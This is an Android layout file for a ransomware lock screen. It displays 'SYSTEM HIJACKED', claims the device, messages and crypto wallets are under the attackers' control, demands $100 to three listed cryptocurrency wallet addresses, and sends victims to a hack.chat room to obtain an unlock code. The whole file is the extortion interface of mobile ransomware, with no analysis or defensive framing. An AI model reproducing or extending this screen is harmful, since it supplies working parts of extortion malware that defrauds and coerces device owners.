<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#0D0000"
    android:gravity="center"
    android:padding="16dp">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="SYSTEM HIJACKED"
        android:textColor="#FF1A1A"
        android:textStyle="bold"
        android:textSize="28sp"/>

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:textColor="#E0E0E0"
        android:textSize="14sp"
        android:lineSpacingExtra="4dp"
        android:text="Your device has been locked.&#10;&#10;All apps, gallery, messages, and crypto wallets are under our control.&#10;&#10;To unlock, send $100 to ANY of the following addresses:&#10;&#10;EVM (ETH/BSC/Polygon):&#10;0x6976995Ba18463E6e7555d73f4CA9dCDAa61349C&#10;&#10;TRON (TRC20):&#10;TWDB3YMGDAZmRmVBQxyeGyiaYPTAVJZbu7&#10;&#10;BTC (Bitcoin):&#10;bc1qwjhnpnlqrm75tr2u4jxfjan2thzahgz8s3ut4u&#10;&#10;After payment, open Chrome and go to:&#10;https://hack.chat/?Redteamdevil&#10;Enter any nickname and send your proof of payment to get the activation code."/>

    <EditText
        android:id="@+id/unlockInput"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:hint="Enter activation code"
        android:textColorHint="#666"
        android:textColor="#FFF"
        android:inputType="text"/>

    <Button
        android:id="@+id/unlockBtn"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="12dp"
        android:text="ACTIVATE"
        android:backgroundTint="#B30000"
        android:textColor="#FFF"/>
</LinearLayout>
